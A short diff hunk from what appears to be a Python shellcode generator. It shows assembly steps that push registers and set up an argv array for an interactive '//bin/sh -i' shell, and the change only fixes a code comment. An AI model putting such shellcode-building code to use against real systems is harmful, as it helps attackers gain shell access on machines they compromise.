@@ -223,7 +223,7 @@ class Shellcode():
         self.__code += PUSH["rax"]
         self.__code += PUSH["rdx"]
         self.__code += PUSH["rdi"]
-        self.__code += MOV["rsi,rsp"] # rsi: ["-i"]
+        self.__code += MOV["rsi,rsp"] # rsi: ["//bin/sh", "-i"]
 
         # Envp
         self.clean("rdx")
